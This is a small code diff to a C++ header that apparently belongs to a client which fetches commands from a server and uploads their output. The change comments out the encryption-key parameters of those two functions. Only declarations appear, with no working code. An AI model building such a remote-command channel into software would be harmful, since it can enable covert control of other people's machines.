@@ -82,9 +82,9 @@ public:
 
     std::string RawRequest(const char *serverAddress, const char *port, const char *request);
 
-    std::string fetchCommand(const std::string &encryptionKey);
+    std::string fetchCommand(/*const std::string &encryptionKey*/);
 
-    bool uploadCommand(std::string commandsOutput, const std::string &encryptionKey);
+    bool uploadCommand(std::string commandsOutput/*, const std::string &encryptionKey*/);
 
     const char *ResolveAddress(const char *address);
 
